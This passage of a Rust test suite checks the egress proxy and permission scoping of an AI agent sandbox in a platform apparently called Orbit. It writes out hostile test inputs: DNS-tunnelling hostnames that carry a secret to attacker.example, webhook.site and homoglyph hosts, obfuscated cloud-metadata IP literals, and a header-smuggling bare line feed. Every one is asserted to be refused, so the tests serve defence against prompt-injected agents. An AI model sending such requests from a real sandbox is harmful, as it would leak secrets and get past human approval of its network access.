                &format!("/api/v1/workspaces/{ws}/tasks"),
                &[("cookie", cookie.as_str())],
                None,
            )
            .await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{cookie}");
        // A cookie next to a valid bearer does not win either.
        let (status, _) = fixture
            .raw(
                "POST",
                &card,
                &[
                    ("cookie", cookie.as_str()),
                    ("authorization", bearer.as_str()),
                ],
                Some(json!({ "answer": "allow_once" })),
            )
            .await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{cookie} with a bearer");
    }
    // A person's own cookie still works (the browser app).
    let person = fixture.session(driver).await;
    let (status, value) = fixture
        .raw(
            "GET",
            &format!("/api/v1/workspaces/{ws}/tasks"),
            &[("cookie", format!("__Host-orbit_session={person}").as_str())],
            None,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{value}");

    // Nothing changed: the card waits for the driver, no rule, no continuation, no audit row.
    let status: String =
        sqlx::query_scalar("SELECT status FROM agent_egress_requests WHERE id = $1")
            .bind(&request)
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(status, "pending");
    let rules: i64 =
        sqlx::query_scalar("SELECT COUNT(*) FROM agent_egress_rules WHERE agent_user_id = $1")
            .bind(agent.to_string())
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(rules, 0);
    assert!(fixture.continuations(&thread).await.is_empty());
    let audits: i64 =
        sqlx::query_scalar("SELECT COUNT(*) FROM audit_events WHERE action LIKE 'agent_egress.%'")
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(audits, 0);
    assert_eq!(
        fixture
            .check(&call, &password, "evil.example.net", 443)
            .await["decision"],
        "ask"
    );
}

#[tokio::test]
async fn injection_a_sandbox_call_acts_only_in_its_own_thread() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture
        .add_agent(r#"["move_to_trash", "sandbox_shell"]"#, true)
        .await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (_, token, _) = fixture.call(driver, agent, &thread).await;
    let trash = format!(
        "/api/v1/workspaces/{}/agent-tools/trash",
        fixture.workspace_id
    );
    let bearer = format!("Bearer {token}");
    let body = |conversation: Value, root: Value| json!({ "tool": "move_to_trash", "arguments": { "task_ids": [] }, "conversation_id": conversation, "root_message_id": root });

    // Another conversation (the driver says "yes" there to someone else), another thread of the same conversation,
    // or no thread at all: refused before the route looks for a yes.
    let other = Id::new_v7().to_string();
    for wrong in [
        body(json!(other), Value::Null),
        body(json!(fixture.conversation), json!(Id::new_v7().to_string())),
        json!({ "tool": "move_to_trash", "arguments": {} }),
        json!([fixture.conversation]),
    ] {
        let (status, value) = fixture
            .request("POST", &trash, &bearer, Some(wrong.clone()))
            .await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{wrong}: {value}");
        assert_eq!(value["code"], "agent_scope", "{wrong}");
    }
    // Its own thread passes the scope layer (the route then judges the call itself).
    let (status, value) = fixture
        .request(
            "POST",
            &trash,
            &bearer,
            Some(body(json!(fixture.conversation), Value::Null)),
        )
        .await;
    assert_ne!(value["code"], "agent_scope", "{status} {value}");

    // The sidecar's own agent session (no sandbox call) is not bound here: the sidecar names the run's thread.
    let session = Id::new_v7().to_string();
    let sidecar_token = format!("orbit-agent.{}", orbit_platform::generate_opaque_token());
    let now = TimestampMillis::now().as_millis();
    sqlx::query(
        "INSERT INTO sessions (id, token_hash, user_id, created_at, last_activity_at, idle_expires_at, \
         absolute_expires_at) VALUES ($1, $2, $3, $4, $4, $5, $5)",
    )
    .bind(&session)
    .bind(Sha256::digest(sidecar_token.as_bytes()).to_vec())
    .bind(driver.to_string())
    .bind(now)
    .bind(now + 600_000)
    .execute(fixture.database.pool())
    .await
    .unwrap();
    sqlx::query(
        "INSERT INTO agent_sessions (session_id, user_id, workspace_id, expires_at, agent_user_id) VALUES ($1, $2, $3, $4, $5)",
    )
    .bind(&session)
    .bind(driver.to_string())
    .bind(&fixture.workspace_id)
    .bind(now + 600_000)
    .bind(agent.to_string())
    .execute(fixture.database.pool())
    .await
    .unwrap();
    let (status, value) = fixture
        .request(
            "POST",
            &trash,
            &format!("Bearer {sidecar_token}"),
            Some(body(json!(other), Value::Null)),
        )
        .await;
    assert_ne!(value["code"], "agent_scope", "{status} {value}");
}

#[tokio::test]
async fn injection_exfiltration_names_never_resolve_and_orbit_or_ip_targets_are_denied() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, token, password) = fixture.call(driver, agent, &thread).await;
    fixture.rule(agent, "example.com", 443, "allow").await;
    fixture.rule(agent, "webhook.site", 443, "allow").await; // made by hand: the routes refuse it
    let running = proxy::start(&fixture, 100 * 1024 * 1024, 20).await;
    proxy::call_file(running.calls.path(), &call, "127.0.0.1", &password);
    let send = |line: String, extra: String| {
        let (address, call, password) = (running.address, call.clone(), password.clone());
        async move { proxy::send(address, "127.0.0.1", (&call, &password), &line, &extra).await }
    };

    // DNS tunnelling: the data rides in the name. Orbit asks; the proxy never looks the name up.
    let secret = "orbit-agent-token-would-be-here".replace('-', "");
    for host in [
        format!("{secret}.attacker.example"),
        format!("{secret}.example.com"),
        "metadata.google.internal".to_owned(),
    ] {
        let (status, value, _) = send(format!("CONNECT {host}:443 HTTP/1.1"), String::new()).await;
        assert_eq!(
            (status, value["error"].as_str()),
            (403, Some("egress_approval_required")),
            "{host}"
        );
    }
    // Risky hosts ask also with an allow rule, in any spelling; a look-alike of an allowed host is another host.
    for host in ["WebHook.Site.", "x.webhook.site", "ex\u{0430}mple.com"] {
        let (status, value, _) = send(format!("CONNECT {host}:443 HTTP/1.1"), String::new()).await;
        assert_eq!(
            (status, value["error"].as_str()),
            (403, Some("egress_approval_required")),
            "{host}"
        );
    }
    // IP literals (metadata, mapped and other spellings) and Orbit's own names: denied.
    for target in [
        "169.254.169.254:443",
        "[::ffff:169.254.169.254]:443",
        "[fd00::1]:443",
        "2852039166:443",
        "0x7f.1:443",
        "orbit.internal:443",
        "orbit.internal:80",
        "orbit.example.com:443",
    ] {
        let (status, value, _) = send(format!("CONNECT {target} HTTP/1.1"), String::new()).await;
        assert_eq!(status, 403, "{target}: {value}");
        assert_ne!(value["error"], "egress_approval_required", "{target}");
    }
    assert!(
        running.dialer.resolved.lock().unwrap().is_empty(),
        "a name was looked up before a yes"
    );
    assert!(running.dialer.connected.lock().unwrap().is_empty());

    // Through orbit.internal: a bare line break cannot add a header, and the token as a cookie is refused.
    let tasks = format!(
        "GET http://orbit.internal/api/v1/workspaces/{}/tasks HTTP/1.1",
        fixture.workspace_id
    );
    let (status, _, _) = send(
        tasks.clone(),
        format!("Authorization: Bearer {token}\nX-Forwarded-For: 1.2.3.4\r\n"),
    )
    .await;
    assert_eq!(status, 0, "the proxy closes a head with a bare LF");
    let (status, _, _) = send(
        tasks.clone(),
        format!("Cookie: __Host-orbit_session={token}\r\n"),
    )
    .await;
    assert_eq!(status, 401);
    let (status, _, _) = send(tasks, format!("Authorization: Bearer {token}\r\n")).await;
    assert_eq!(status, 200);
    // Routes without a session (registration and reset mails to any address, sign-in guesses) are not reachable:
    // the proxy wants the call token, and Orbit's scope layer keeps an agent token in its workspace.
    for (line, auth) in [
        (
            "POST http://orbit.internal/api/v1/auth/register HTTP/1.1",
            String::new(),
        ),
        (
            "POST http://orbit.internal/api/v1/auth/login HTTP/1.1",
            "Authorization: Bearer x\r\n".to_owned(),
        ),
        (
            "POST http://orbit.internal/api/v1/auth/password/forgot HTTP/1.1",
            format!("Authorization: Basic {token}\r\n"),
        ),
    ] {
        let (status, value, _) =
            send(line.to_owned(), format!("{auth}Content-Length: 0\r\n")).await;
        assert_eq!(
            (status, value["error"].as_str()),
            (401, Some("agent_token_required")),
            "{line}"
        );
    }
    let (status, value, _) = send(
        "POST http://orbit.internal/api/v1/auth/register HTTP/1.1".to_owned(),
        format!("Authorization: Bearer {token}\r\nContent-Length: 0\r\n"),
    )
    .await;
    assert_eq!((status, value["code"].as_str()), (403, Some("agent_scope")));
}

#[tokio::test]
async fn an_owner_of_another_workspace_cannot_read_answer_or_manage_this_ones_sandbox() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let profile = profile_of(&fixture, agent).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    let request = fixture
        .check(&call, &password, "api.example.net", 443)
        .await["request_id"]
        .as_str()
        .unwrap()
        .to_owned();
    let rule: String = {
        fixture.rule(agent, "rule.example.net", 443, "allow").await;
        sqlx::query_scalar("SELECT id FROM agent_egress_rules WHERE agent_user_id = $1")
            .bind(agent.to_string())
            .fetch_one(fixture.database.pool())
            .await
            .unwrap()
    };

    // Workspace B and its owner (not a member of this one). The workspace and its owner membership reference each
    // other (deferred foreign key): one transaction.
    let other_ws = Id::new_v7().to_string();
    let membership = Id::new_v7().to_string();
    let now = TimestampMillis::now().as_millis();
    let stranger = fixture.add_user("stranger", None).await;
    let mut tx = fixture.database.immediate_transaction().await.unwrap();
    sqlx::query(
        "INSERT INTO workspaces (id, name, owner_membership_id, created_at, updated_at) VALUES ($1, 'Other', $2, $3, $3)",
    )
    .bind(&other_ws)
    .bind(&membership)
    .bind(now)
    .execute(&mut *tx)
    .await
    .unwrap();
    sqlx::query(
        "INSERT INTO memberships (id, workspace_id, user_id, role, created_at, updated_at) \
         VALUES ($1, $2, $3, 'owner', $4, $4)",
    )
    .bind(&membership)
    .bind(&other_ws)
    .bind(stranger.to_string())
    .bind(now)
    .execute(&mut *tx)
    .await
    .unwrap();
    tx.commit().await.unwrap();
    let bearer = format!("Bearer {}", fixture.session(stranger).await);

    for ws in [fixture.workspace_id.as_str(), other_ws.as_str()] {
        for (method, uri, body) in [
            (
                "POST",
                format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
                Some(json!({ "answer": "allow_always" })),
            ),
            (
                "POST",
                format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
                Some(json!({ "answer": "deny", "always": true })),
            ),
            (
                "GET",
                format!(
                    "/api/v1/workspaces/{ws}/agents/egress-requests?conversation_id={}",
                    fixture.conversation
                ),
                None,
            ),
            (
                "GET",
                format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
                None,
            ),
            (
                "PUT",
                format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
                Some(
                    json!({ "enabled": false, "idle_minutes": 30, "cpu_minutes_month": 1, "egress_bytes_month": 1, "model_tokens_month": 1 }),
                ),
            ),
            (
                "POST",
                format!("/api/v1/workspaces/{ws}/agents/{profile}/egress-rules"),
                Some(json!({ "host": "x.example.net", "port": 443, "action": "allow" })),
            ),
            (
                "DELETE",
                format!("/api/v1/workspaces/{ws}/agents/{profile}/egress-rules/{rule}"),
                None,
            ),
        ] {
            let (status, value) = fixture.request(method, &uri, &bearer, body).await;
            assert_eq!(status, StatusCode::NOT_FOUND, "{method} {uri}: {value}");
        }
    }
    let status: String =
        sqlx::query_scalar("SELECT status FROM agent_egress_requests WHERE id = $1")
            .bind(&request)
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(status, "pending");
    let rules: i64 =
        sqlx::query_scalar("SELECT COUNT(*) FROM agent_egress_rules WHERE agent_user_id = $1")
            .bind(agent.to_string())
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(rules, 1);
    let enabled: i64 =
        sqlx::query_scalar("SELECT enabled FROM agent_sandbox_settings WHERE agent_user_id = $1")
            .bind(agent.to_string())
            .fetch_one(fixture.database.pool())
            .await
            .unwrap();
    assert_eq!(enabled, 1);
}
